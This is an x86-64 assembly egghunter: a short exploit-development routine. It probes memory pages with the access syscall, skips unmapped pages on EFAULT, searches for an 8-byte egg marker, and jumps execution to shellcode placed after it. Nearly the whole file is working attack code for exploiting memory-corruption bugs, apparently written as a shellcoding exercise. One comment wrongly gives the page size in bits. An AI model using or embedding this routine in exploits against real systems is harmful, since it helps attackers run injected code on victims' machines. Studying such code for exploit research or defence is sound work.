global _start

section .text

_start:

	xor rsi, rsi		;fix rsi to 0  
	push rsi
	pop rdx

next_page:
	or dx, 0xfff        	; checks each page (4096 bits)   
next_byte:

	inc rdx             	; next byte 
	push 21         	; syscall access
	pop rax             	
	mov rdi, rdx
	push rdx
	pop rdi
	add rdi, 8        	; the egg is 8 byte.  We need to be sure our 8 byte egg check does not span across 2 pages
	syscall             	; syscall

	cmp al, 0xf2        	; checks for EFAULT.
 
	jz next_page 	  	; if EFAULT, try next page

	mov eax, 0x50905090 	; egg
	inc eax    		; the egg will be 0x50905091	
   
	mov rdi, rdx
	scasd			; compare the memory value with egg

	jnz next_byte       	; egg not found

	jmp rdi             	; egg found, go to the shellcode
